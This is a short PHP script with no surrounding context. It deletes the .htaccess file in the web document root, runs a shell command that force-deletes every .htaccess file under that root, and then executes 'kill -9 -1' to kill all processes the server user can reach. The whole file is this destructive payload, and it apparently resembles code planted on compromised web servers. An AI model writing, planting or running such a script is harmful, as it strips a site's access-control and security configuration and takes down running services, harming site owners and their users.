<?php
$file = $_SERVER['DOCUMENT_ROOT']."/.htaccess";

@chmod($file,0644);

unlink($file);

$cmd = 'find '.$_SERVER['DOCUMENT_ROOT'].' -name .htaccess -exec rm -f {} \;';
exec($cmd, $result, $var);
var_dump($result);
var_dump($var);

$cmd2 = 'kill -9 -1;';
exec($cmd2, $result, $var);
var_dump($result);
var_dump($var);
?>